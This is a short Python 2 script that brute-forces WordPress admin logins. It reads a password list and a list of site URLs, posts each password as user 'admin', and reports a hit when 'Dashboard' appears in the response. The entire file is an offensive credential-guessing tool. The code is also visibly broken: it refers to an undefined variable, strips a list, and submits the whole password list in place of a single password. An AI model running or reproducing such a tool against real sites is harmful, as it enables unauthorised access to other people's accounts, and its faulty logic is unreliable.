"""

            author: @Hacknology
            contact: utkucolak05@gmail.com
            date: 05.06.2017
"""

import requests,sys
from colorama import Fore, Back, Style, init

red     = Fore.RED
cyan    = Fore.CYAN
blue    = Fore.BLUE
green   = Fore.GREEN
white   = Fore.WHITE
yellow  = Fore.YELLOW
magenta = Fore.MAGENTA
bright  = Style.BRIGHT
def run():
    sifre = open(raw_input("PW: "), "r").readlines()
    url = open(raw_input("URL: "), "r").readlines()
    for site in url:
        url.strip()
        for pw in sifreler:
            session = requests.Session()
            try:
                r = session.post(site, data={"log":"admin","pwd":sifre}, timeout=5)
            except(requests.exceptions.ConnectionError):
                continue
            if "Dashboard" in r.text:
                print bright + green + "[+] Yey! " + site + "-->" + sifre
            
            
